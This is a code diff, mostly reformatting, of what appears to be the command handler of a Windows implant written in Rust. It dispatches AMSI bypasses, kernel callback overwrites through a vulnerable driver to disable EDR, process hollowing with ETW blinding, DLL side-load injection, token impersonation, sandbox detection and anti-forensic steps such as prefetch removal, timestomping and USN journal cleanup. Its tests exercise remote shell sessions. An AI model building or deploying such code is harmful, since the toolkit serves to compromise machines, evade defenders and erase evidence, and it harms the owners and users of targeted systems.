                     #[cfg(not(feature = "write-raid-amsi"))]
                     {
-                        Err("write-raid AMSI bypass not compiled (missing write-raid-amsi feature)".to_string())
+                        Err(
+                            "write-raid AMSI bypass not compiled (missing write-raid-amsi feature)"
+                                .to_string(),
+                        )
                     }
                 }
                 Mode::Hwbp => {
@@ -1293,11 +1277,14 @@ pub async fn handle_command(
                     #[cfg(feature = "write-raid-amsi")]
                     {
                         match crate::amsi_defense::enable_write_raid() {
-                            Ok(()) => Ok("AMSI write-raid bypass enabled (auto-selected)".to_string()),
+                            Ok(()) => {
+                                Ok("AMSI write-raid bypass enabled (auto-selected)".to_string())
+                            }
                             Err(_) => {
                                 log::warn!("auto: write-raid failed, falling back to memory-patch");
                                 crate::amsi_defense::orchestrate_layers();
-                                Ok("AMSI memory-patch bypass applied (write-raid fallback)".to_string())
+                                Ok("AMSI memory-patch bypass applied (write-raid fallback)"
+                                    .to_string())
                             }
                         }
                     }
@@ -1319,21 +1306,14 @@ pub async fn handle_command(
         }
 
         #[cfg(not(windows))]
-        Command::AmsiBypassMode { .. } => {
-            Err("AMSI bypass requires Windows".to_string())
-        }
+        Command::AmsiBypassMode { .. } => Err("AMSI bypass requires Windows".to_string()),
 
         // ── Evanesco continuous memory hiding ────────────────────────────
-
         /// Return status of the Evanesco page-tracker subsystem.
         #[cfg(all(windows, feature = "evanesco"))]
-        Command::EvanescoStatus => {
-            Ok(crate::page_tracker::status_json())
-        }
+        Command::EvanescoStatus => Ok(crate::page_tracker::status_json()),
         #[cfg(not(all(windows, feature = "evanesco")))]
-        Command::EvanescoStatus => {
-            Err("evanesco feature not enabled".to_string())
-        }
+        Command::EvanescoStatus => Err("evanesco feature not enabled".to_string()),
 
         /// Dynamically adjust the Evanesco idle threshold.
         #[cfg(all(windows, feature = "evanesco"))]
@@ -1342,9 +1322,7 @@ pub async fn handle_command(
             Ok(format!("Evanesco idle threshold set to {}ms", idle_ms))
         }
         #[cfg(not(all(windows, feature = "evanesco")))]
-        Command::EvanescoSetThreshold { .. } => {
-            Err("evanesco feature not enabled".to_string())
-        }
+        Command::EvanescoSetThreshold { .. } => Err("evanesco feature not enabled".to_string()),
 
         // ── Kernel callback overwrite (BYOVD, Windows only) ───────────
 
@@ -1358,9 +1336,7 @@ pub async fn handle_command(
             }
         }
         #[cfg(not(all(windows, feature = "kernel-callback")))]
-        Command::KernelCallbackScan => {
-            Err("kernel-callback feature not enabled".to_string())
-        }
+        Command::KernelCallbackScan => Err("kernel-callback feature not enabled".to_string()),
 
         // Deploy driver + overwrite EDR callbacks with ret.
         #[cfg(all(windows, feature = "kernel-callback"))]
@@ -1386,29 +1362,20 @@ pub async fn handle_command(
             }
         }
         #[cfg(not(all(windows, feature = "kernel-callback")))]
-        Command::KernelCallbackRestore => {
-            Err("kernel-callback feature not enabled".to_string())
-        }
+        Command::KernelCallbackRestore => Err("kernel-callback feature not enabled".to_string()),
 
         // ── EDR bypass transformation engine ─────────────────────────────
-
         /// Scan .text for known EDR byte signatures.
         #[cfg(feature = "evasion-transform")]
-        Command::EvasionTransformScan => {
-            match crate::edr_bypass_transform::scan_for_signatures() {
-                Ok(hits) => {
-                    match serde_json::to_string_pretty(&hits) {
-                        Ok(json) => Ok(json),
-                        Err(e) => Err(format!("serialization failed: {e}")),
-                    }
-                }
-                Err(e) => Err(format!("evasion transform scan failed: {e}")),
-            }
-        }
+        Command::EvasionTransformScan => match crate::edr_bypass_transform::scan_for_signatures() {
+            Ok(hits) => match serde_json::to_string_pretty(&hits) {
+                Ok(json) => Ok(json),
+                Err(e) => Err(format!("serialization failed: {e}")),
+            },
+            Err(e) => Err(format!("evasion transform scan failed: {e}")),
+        },
         #[cfg(not(feature = "evasion-transform"))]
-        Command::EvasionTransformScan => {
-            Err("evasion-transform feature not enabled".to_string())
-        }
+        Command::EvasionTransformScan => Err("evasion-transform feature not enabled".to_string()),
 
         /// Run one scan-and-transform cycle.
         #[cfg(feature = "evasion-transform")]
@@ -1420,29 +1387,21 @@ pub async fn handle_command(
                 max_transforms,
                 entropy_threshold,
             ) {
-                Ok(result) => {
-                    match serde_json::to_string_pretty(&result) {
-                        Ok(json) => Ok(json),
-                        Err(e) => Err(format!("serialization failed: {e}")),
-                    }
-                }
+                Ok(result) => match serde_json::to_string_pretty(&result) {
+                    Ok(json) => Ok(json),
+                    Err(e) => Err(format!("serialization failed: {e}")),
+                },
                 Err(e) => Err(format!("evasion transform run failed: {e}")),
             }
         }
         #[cfg(not(feature = "evasion-transform"))]
-        Command::EvasionTransformRun => {
-            Err("evasion-transform feature not enabled".to_string())
-        }
+        Command::EvasionTransformRun => Err("evasion-transform feature not enabled".to_string()),
 
         /// Query EDR bypass transform status (last scan hits, skipped, total transforms, timestamp).
         #[cfg(feature = "evasion-transform")]
-        Command::EdrBypassStatus => {
-            Ok(crate::edr_bypass_transform::status())
-        }
+        Command::EdrBypassStatus => Ok(crate::edr_bypass_transform::status()),
         #[cfg(not(feature = "evasion-transform"))]
-        Command::EdrBypassStatus => {
-            Err("evasion-transform feature not enabled".to_string())
-        }
+        Command::EdrBypassStatus => Err("evasion-transform feature not enabled".to_string()),
 
         /// NTFS transaction-based process hollowing with ETW blinding.
         #[cfg(all(windows, feature = "transacted-hollowing"))]
@@ -1466,9 +1425,7 @@ pub async fn handle_command(
                     // Post-injection hook: auto-clean prefetch evidence
                     // for the target process.  Best-effort, non-blocking.
                     #[cfg(all(windows, feature = "forensic-cleanup"))]
-                    crate::forensic_cleanup::prefetch::auto_clean_after_injection(
-                        target_process,
-                    );
+                    crate::forensic_cleanup::prefetch::auto_clean_after_injection(target_process);
                     match serde_json::to_string_pretty(&serde_json::json!({
                         "pid": handle.target_pid,
                         "base_addr": format!("{:#x}", handle.injected_base_addr),
@@ -1524,9 +1481,10 @@ pub async fn handle_command(
                         // Post-injection hook: auto-clean prefetch evidence
                         // for the target process.  Best-effort, non-blocking.
                         #[cfg(all(windows, feature = "forensic-cleanup"))]
-                        crate::forensic_cleanup::prefetch::auto_clean_after_injection(
-                            &format!("pid:{}", target_pid),
-                        );
+                        crate::forensic_cleanup::prefetch::auto_clean_after_injection(&format!(
+                            "pid:{}",
+                            target_pid
+                        ));
                         Ok(json)
                     }
                     Err(e) => Err(format!("delayed stomp failed: {e}")),
@@ -1538,9 +1496,7 @@ pub async fn handle_command(
             Err("DelayedStomp is only available on Windows".to_string())
         }
         #[cfg(not(feature = "delayed-stomp"))]
-        Command::DelayedStomp { .. } => {
-            Err("delayed-stomp feature not enabled".to_string())
-        }
+        Command::DelayedStomp { .. } => Err("delayed-stomp feature not enabled".to_string()),
 
         // ── DLL side-load injection with export forwarding ──────────────
         // Decrypts the payload, opens the target process, resolves the
@@ -1548,7 +1504,11 @@ pub async fn handle_command(
         // and executes via NtCreateThreadEx.  Produces a side-loaded DLL
         // with a legitimate export table in memory.
         #[cfg(windows)]
-        Command::InjectSideLoad { pid, ref payload, ref export_config } => {
+        Command::InjectSideLoad {
+            pid,
+            ref payload,
+            ref export_config,
+        } => {
             use crate::injection::dll_sideload::DllSideLoadInjector;
             let injector = DllSideLoadInjector;
             match injector.inject_with_export_forwarding(pid, payload, export_config) {
@@ -1614,7 +1574,7 @@ pub async fn handle_command(
                             // Post-injection hook: auto-clean prefetch evidence.
                             #[cfg(feature = "forensic-cleanup")]
                             crate::forensic_cleanup::prefetch::auto_clean_after_injection(
-                                target_process.as_str()
+                                target_process.as_str(),
                             );
                             match serde_json::to_string_pretty(&serde_json::json!({
                                 "pid": handle.target_pid,
@@ -1645,17 +1605,17 @@ pub async fn handle_command(
             let indicators = crate::env_check::collect_indicators();
             let (is_sandbox, _) = crate::env_check::evaluate_sandbox_score(&indicators);
             let total_weight: u32 = indicators.iter().map(|i| i.weight).sum();
-            let cloud_hypervisor = indicators.iter().any(|i| {
-                i.category == "cloud_bios" && i.detail.contains("DMI/registry")
-            });
-            let cloud_imds = indicators.iter().any(|i| {
-                i.category == "cloud_bios" && i.detail.contains("IMDS")
-            });
+            let cloud_hypervisor = indicators
+                .iter()
+                .any(|i| i.category == "cloud_bios" && i.detail.contains("DMI/registry"));
+            let cloud_imds = indicators
+                .iter()
+                .any(|i| i.category == "cloud_bios" && i.detail.contains("IMDS"));
 
             // Replicate threshold calculation from evaluate_sandbox_score
-            let hypervisor_bit_set = indicators.iter().any(|i| {
-                i.category == "hypervisor" && i.detail.contains("CPUID")
-            });
+            let hypervisor_bit_set = indicators
+                .iter()
+                .any(|i| i.category == "hypervisor" && i.detail.contains("CPUID"));
             let likely_legitimate_server = hypervisor_bit_set
                 && crate::env_check::get_ram_gb() > 4
                 && crate::env_check::get_uptime_secs() > 24 * 3600;
@@ -1676,8 +1636,10 @@ pub async fn handle_command(
                 "indicator_count": indicators.len(),
                 "indicators": indicators,
             });
-            Ok(serde_json::to_string(&result)
-                .unwrap_or_else(|e| format!("{{\"error\": \"{e}\"}}")))
+            Ok(
+                serde_json::to_string(&result)
+                    .unwrap_or_else(|e| format!("{{\"error\": \"{e}\"}}")),
+            )
         }
 
         // ── Syscall emulation toggle ────────────────────────────────────
@@ -1695,7 +1657,7 @@ pub async fn handle_command(
             Err("syscall-emulation feature not enabled".to_string())
         }
 
-// ── CET / Shadow Stack status ────────────────────────────────────
+        // ── CET / Shadow Stack status ────────────────────────────────────
         // Query the current CET (Control-flow Enforcement Technology) /
         // shadow-stack status.  Returns a JSON object describing whether
         // CET is present, enabled, and which bypass strategy is active.
@@ -1705,18 +1667,15 @@ pub async fn handle_command(
             Ok(status)
         }
         #[cfg(not(all(windows, feature = "cet-bypass")))]
-        Command::CetStatus => {
-            Err("cet-bypass feature not enabled".to_string())
-        }
+        Command::CetStatus => Err("cet-bypass feature not enabled".to_string()),
 
-// ── Token-only impersonation (Windows only) ─────────────────────────
+        // ── Token-only impersonation (Windows only) ─────────────────────────
         // Create a named pipe, wait for a client, and extract the
         // impersonation token via NtImpersonateThread or SetThreadToken
         // (avoids ImpersonateNamedPipeClient on the main thread).
         #[cfg(all(windows, feature = "token-impersonation"))]
         Command::ImpersonatePipe { ref pipe_name } => {
-            crate::token_impersonation::impersonate_pipe(pipe_name)
-                .map_err(|e| e.to_string())
+            crate::token_impersonation::impersonate_pipe(pipe_name).map_err(|e| e.to_string())
         }
         #[cfg(not(all(windows, feature = "token-impersonation")))]
         Command::ImpersonatePipe { .. } => {
@@ -1726,23 +1685,16 @@ pub async fn handle_command(
         // Revert the current thread's impersonation token.
         #[cfg(all(windows, feature = "token-impersonation"))]
         Command::RevertToken => {
-            crate::token_impersonation::revert_token()
-                .map_err(|e| e.to_string())
+            crate::token_impersonation::revert_token().map_err(|e| e.to_string())
         }
         #[cfg(not(all(windows, feature = "token-impersonation")))]
-        Command::RevertToken => {
-            Err("token-impersonation feature not enabled".to_string())
-        }
+        Command::RevertToken => Err("token-impersonation feature not enabled".to_string()),
 
         // List all cached impersonation tokens.
         #[cfg(all(windows, feature = "token-impersonation"))]
-        Command::ListTokens => {
-            Ok(crate::token_impersonation::list_tokens_json())
-        }
+        Command::ListTokens => Ok(crate::token_impersonation::list_tokens_json()),
         #[cfg(not(all(windows, feature = "token-impersonation")))]
-        Command::ListTokens => {
-            Err("token-impersonation feature not enabled".to_string())
-        }
+        Command::ListTokens => Err("token-impersonation feature not enabled".to_string()),
 
         // ── Forensic cleanup: Prefetch evidence removal ────────────────────
         // Cleans Windows Prefetch (.pf) evidence for the specified
@@ -1754,33 +1706,23 @@ pub async fn handle_command(
             crate::forensic_cleanup::prefetch::clean_prefetch(&exe_name)
         }
         #[cfg(not(all(windows, feature = "forensic-cleanup")))]
-        Command::CleanPrefetch { .. } => {
-            Err("forensic-cleanup feature not enabled".to_string())
-        }
+        Command::CleanPrefetch { .. } => Err("forensic-cleanup feature not enabled".to_string()),
 
         // Disable the Windows Prefetch service by setting the
         // EnablePrefetcher registry value to 0.  Saves the previous
         // value for later restoration.
         #[cfg(all(windows, feature = "forensic-cleanup"))]
-        Command::DisablePrefetch => {
-            crate::forensic_cleanup::prefetch::disable_prefetch()
-        }
+        Command::DisablePrefetch => crate::forensic_cleanup::prefetch::disable_prefetch(),
         #[cfg(not(all(windows, feature = "forensic-cleanup")))]
-        Command::DisablePrefetch => {
-            Err("forensic-cleanup feature not enabled".to_string())
-        }
+        Command::DisablePrefetch => Err("forensic-cleanup feature not enabled".to_string()),
 
         // Restore the Windows Prefetch service to its previous state
         // (sets EnablePrefetcher back to the value captured by
         // DisablePrefetch).
         #[cfg(all(windows, feature = "forensic-cleanup"))]
-        Command::RestorePrefetch => {
-            crate::forensic_cleanup::prefetch::restore_prefetch()
-        }
+        Command::RestorePrefetch => crate::forensic_cleanup::prefetch::restore_prefetch(),
         #[cfg(not(all(windows, feature = "forensic-cleanup")))]
-        Command::RestorePrefetch => {
-            Err("forensic-cleanup feature not enabled".to_string())
-        }
+        Command::RestorePrefetch => Err("forensic-cleanup feature not enabled".to_string()),
 
         // Synchronize timestamps for a single file using either the explicit
         // reference file or the configured default reference.
@@ -1808,14 +1750,14 @@ pub async fn handle_command(
                 .map(|_| "Timestomp complete".to_string())
             } else {
                 let reference_nt = to_nt_wide(&reference_file);
-                unsafe { crate::forensic_cleanup::timestamps::sync_timestamps(&file_nt, &reference_nt) }
-                    .map(|_| "Timestomp complete".to_string())
+                unsafe {
+                    crate::forensic_cleanup::timestamps::sync_timestamps(&file_nt, &reference_nt)
+                }
+                .map(|_| "Timestomp complete".to_string())
             }
         }
         #[cfg(not(all(windows, feature = "forensic-cleanup")))]
-        Command::Timestomp { .. } => {
-            Err("forensic-cleanup feature not enabled".to_string())
-        }
+        Command::Timestomp { .. } => Err("forensic-cleanup feature not enabled".to_string()),
 
         #[cfg(all(windows, feature = "forensic-cleanup"))]
         Command::TimestompDirectory {
@@ -1874,9 +1816,7 @@ pub async fn handle_command(
                 .map(|_| format!("USN cleanup completed for {vol}"))
         }
         #[cfg(not(all(windows, feature = "forensic-cleanup")))]
-        Command::CleanUsn { .. } => {
-            Err("forensic-cleanup feature not enabled".to_string())
-        }
+        Command::CleanUsn { .. } => Err("forensic-cleanup feature not enabled".to_string()),
 
         #[cfg(all(windows, feature = "forensic-cleanup"))]
         Command::SyncTimestamps => {
@@ -1896,7 +1836,10 @@ pub async fn handle_command(
                 {
                     Ok(Ok(candidates)) => {
                         if candidates.is_empty() {
-                            Ok("SyncTimestamps: no recently modified files found in allowed paths".to_string())
+                            Ok(
+                                "SyncTimestamps: no recently modified files found in allowed paths"
+                                    .to_string(),
+                            )
                         } else {
                             let mut synced = 0usize;
                             let mut failed = Vec::new();
@@ -1937,9 +1880,7 @@ pub async fn handle_command(
             }
         }
         #[cfg(not(all(windows, feature = "forensic-cleanup")))]
-        Command::SyncTimestamps => {
-            Err("forensic-cleanup feature not enabled".to_string())
-        }
+        Command::SyncTimestamps => Err("forensic-cleanup feature not enabled".to_string()),
 
         // ── Page Tracker telemetry gateway ──────────────────────────────
         // PageTrackerStatus is the only authorized way to query page
@@ -1948,24 +1889,16 @@ pub async fn handle_command(
         // Once RBAC (P1-26) is implemented, this command will require
         // at least read permission level.
         #[cfg(all(windows, feature = "evanesco"))]
-        Command::PageTrackerStatus => {
-            Ok(crate::page_tracker::status_json())
-        }
+        Command::PageTrackerStatus => Ok(crate::page_tracker::status_json()),
         #[cfg(not(all(windows, feature = "evanesco")))]
-        Command::PageTrackerStatus => {
-            Err("evanesco feature not enabled".to_string())
-        }
+        Command::PageTrackerStatus => Err("evanesco feature not enabled".to_string()),
 
         // Redacted version for lower-privilege callers — page counts
         // only, no timing/counters/thresholds.
         #[cfg(all(windows, feature = "evanesco"))]
-        Command::PageTrackerStatusRedacted => {
-            Ok(crate::page_tracker::status_redacted())
-        }
+        Command::PageTrackerStatusRedacted => Ok(crate::page_tracker::status_redacted()),
         #[cfg(not(all(windows, feature = "evanesco")))]
-        Command::PageTrackerStatusRedacted => {
-            Err("evanesco feature not enabled".to_string())
-        }
+        Command::PageTrackerStatusRedacted => Err("evanesco feature not enabled".to_string()),
     };
 
     // Auto-revert the impersonation token after task completion if
@@ -2208,7 +2141,11 @@ mod tests {
             p2p_mesh.clone(),
         )
         .await;
-        assert!(input_res.is_ok(), "ShellInput should succeed: {:?}", input_res);
+        assert!(
+            input_res.is_ok(),
+            "ShellInput should succeed: {:?}",
+            input_res
+        );
 
         // Give the reader thread time to capture output.
         tokio::time::sleep(std::time::Duration::from_millis(200)).await;
@@ -2217,7 +2154,11 @@ mod tests {
         while let Ok(msg) = out_rx.try_recv() {
             // Just verify they're the right type.
             match msg {
-                Message::ShellOutput { session_id: sid, data, .. } => {
+                Message::ShellOutput {
+                    session_id: sid,
+                    data,
+                    ..
+                } => {
                     assert_eq!(sid, session_id, "ShellOutput should reference our session");
                     let _ = data; // don't care about content for lifecycle test
                 }
@@ -2237,8 +2178,11 @@ mod tests {
         .await;
         let list_str = list_res.expect("ShellList should succeed");
         let list: Vec<serde_json::Value> = serde_json::from_str(&list_str).unwrap();
-        assert!(list.iter().any(|e| e["session_id"].as_u64().unwrap() as u32 == session_id),
-            "ShellList should include our session");
+        assert!(
+            list.iter()
+                .any(|e| e["session_id"].as_u64().unwrap() as u32 == session_id),
+            "ShellList should include our session"
+        );
 
         // Close the shell.
         let (close_res, _, _) = handle_command(
@@ -2250,6 +2194,10 @@ mod tests {
             p2p_mesh,
         )
         .await;
-        assert!(close_res.is_ok(), "ShellClose should succeed: {:?}", close_res);
+        assert!(
+            close_res.is_ok(),
+            "ShellClose should succeed: {:?}",
+            close_res
+        );
     }
 }
